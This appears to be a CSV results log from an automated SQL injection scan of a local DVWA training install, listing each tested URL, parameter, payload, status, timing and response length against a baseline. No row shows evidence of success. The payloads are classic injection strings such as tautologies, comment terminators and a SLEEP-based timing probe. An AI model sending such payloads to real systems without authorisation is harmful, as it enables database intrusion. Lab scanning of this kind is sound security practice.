page_url,param_tested,method,payload,status,elapsed,length,evidence,baseline_length,baseline_elapsed
http://127.0.0.1/dvwa/css/source.css,id,GET,' OR 1=1--,200,0.005398,240,,240,0.005577
http://127.0.0.1/dvwa/css/source.css,id,GET,""" OR """" = """,200,0.004815,240,,240,0.005577
http://127.0.0.1/dvwa/css/source.css,id,GET,' OR SLEEP(5) --,200,0.004517,240,,240,0.005577
http://127.0.0.1/dvwa/css/source.css,id,GET,1' OR '1'='1,200,0.004231,240,,240,0.005577
http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,' OR '1'='1,200,0.004836,0,,0,0.007199
http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,' OR '1'='1' -- ,200,0.00454,0,,0,0.007199
http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,' OR 1=1--,200,0.004799,0,,0,0.007199
http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,""" OR """" = """,200,0.003375,0,,0,0.007199
http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,' OR SLEEP(5) --,200,0.00538,0,,0,0.007199
http://127.0.0.1/dvwa/includes/dvwaPhpIds.inc.php,id,GET,1' OR '1'='1,200,0.004279,0,,0,0.007199
http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,' OR '1'='1,200,0.003866,45,,45,0.004204
http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,' OR '1'='1' -- ,200,0.003988,45,,45,0.004204
http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,' OR 1=1--,200,0.003573,45,,45,0.004204
http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,""" OR """" = """,200,0.003845,45,,45,0.004204
http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,' OR SLEEP(5) --,200,0.003101,45,,45,0.004204
http://127.0.0.1/dvwa/includes/dvwaPage.inc.php,id,GET,1' OR '1'='1,200,0.003575,45,,45,0.004204
http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,' OR '1'='1,200,0.004592,1377,,1377,0.004723
http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,' OR '1'='1' -- ,200,0.0035,1377,,1377,0.004723
http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,' OR 1=1--,200,0.004845,1377,,1377,0.004723
http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,""" OR """" = """,200,0.005113,1377,,1377,0.004723
http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,' OR SLEEP(5) --,200,0.004652,1377,,1377,0.004723
http://127.0.0.1/dvwa/includes/?C=N;O=D,id,GET,1' OR '1'='1,200,0.004753,1377,,1377,0.004723
http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,' OR '1'='1,200,0.004569,1377,,1377,0.005062
http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,' OR '1'='1' -- ,200,0.003768,1377,,1377,0.005062
http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,' OR 1=1--,200,0.004483,1377,,1377,0.005062
http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,""" OR """" = """,200,0.004285,1377,,1377,0.005062
http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,' OR SLEEP(5) --,200,0.004755,1377,,1377,0.005062
http://127.0.0.1/dvwa/includes/?C=S;O=A,id,GET,1' OR '1'='1,200,0.004839,1377,,1377,0.005062
http://127.0.0.1/dvwa/includes/DBMS/,id,GET,' OR '1'='1,200,0.004265,1174,,1174,0.00456
http://127.0.0.1/dvwa/includes/DBMS/,id,GET,' OR '1'='1' -- ,200,0.005252,1174,,1174,0.00456
http://127.0.0.1/dvwa/includes/DBMS/,id,GET,' OR 1=1--,200,0.005248,1174,,1174,0.00456
http://127.0.0.1/dvwa/includes/DBMS/,id,GET,""" OR """" = """,200,0.006706,1174,,1174,0.00456
http://127.0.0.1/dvwa/includes/DBMS/,id,GET,' OR SLEEP(5) --,200,0.005458,1174,,1174,0.00456
http://127.0.0.1/dvwa/includes/DBMS/,id,GET,1' OR '1'='1,200,0.005333,1174,,1174,0.00456
http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,' OR '1'='1,200,0.006128,1377,,1377,0.006071
http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,' OR '1'='1' -- ,200,0.006343,1377,,1377,0.006071
http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,' OR 1=1--,200,0.005523,1377,,1377,0.006071
http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,""" OR """" = """,200,0.005758,1377,,1377,0.006071
http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,' OR SLEEP(5) --,200,0.004239,1377,,1377,0.006071
http://127.0.0.1/dvwa/includes/?C=M;O=A,id,GET,1' OR '1'='1,200,0.006808,1377,,1377,0.006071
http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,' OR '1'='1,200,0.005024,1377,,1377,0.005337
http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,' OR '1'='1' -- ,200,0.005151,1377,,1377,0.005337
http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,' OR 1=1--,200,0.006675,1377,,1377,0.005337
http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,""" OR """" = """,200,0.005304,1377,,1377,0.005337
http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,' OR SLEEP(5) --,200,0.005403,1377,,1377,0.005337
http://127.0.0.1/dvwa/includes/?C=D;O=A,id,GET,1' OR '1'='1,200,0.004354,1377,,1377,0.005337
http://127.0.0.1/dvwa/images/spanner.png,id,GET,' OR '1'='1,200,0.003127,446,,446,0.003953
http://127.0.0.1/dvwa/images/spanner.png,id,GET,' OR '1'='1' -- ,200,0.002503,446,,446,0.003953
http://127.0.0.1/dvwa/images/spanner.png,id,GET,' OR 1=1--,200,0.003765,446,,446,0.003953
http://127.0.0.1/dvwa/images/spanner.png,id,GET,""" OR """" = """,200,0.003575,446,,446,0.003953
http://127.0.0.1/dvwa/images/spanner.png,id,GET,' OR SLEEP(5) --,200,0.003075,446,,446,0.003953
http://127.0.0.1/dvwa/images/spanner.png,id,GET,1' OR '1'='1,200,0.008176,446,,446,0.003953
http://127.0.0.1/dvwa/images/warning.png,id,GET,' OR '1'='1,200,0.00487,401,,401,0.005647
http://127.0.0.1/dvwa/images/warning.png,id,GET,' OR '1'='1' -- ,200,0.005132,401,,401,0.005647
http://127.0.0.1/dvwa/images/warning.png,id,GET,' OR 1=1--,200,0.004385,401,,401,0.005647
http://127.0.0.1/dvwa/images/warning.png,id,GET,""" OR """" = """,200,0.005145,401,,401,0.005647
http://127.0.0.1/dvwa/images/warning.png,id,GET,' OR SLEEP(5) --,200,0.004623,401,,401,0.005647
http://127.0.0.1/dvwa/images/warning.png,id,GET,1' OR '1'='1,200,0.004728,401,,401,0.005647
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,' OR '1'='1,200,0.006814,8641,,8641,0.004709
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,' OR '1'='1' -- ,200,0.005244,8641,,8641,0.004709
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,' OR 1=1--,200,0.004326,8641,,8641,0.004709
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,""" OR """" = """,200,0.005499,8641,,8641,0.004709
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,' OR SLEEP(5) --,200,0.00548,8641,,8641,0.004709
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,1' OR '1'='1,200,0.003831,8641,,8641,0.004709
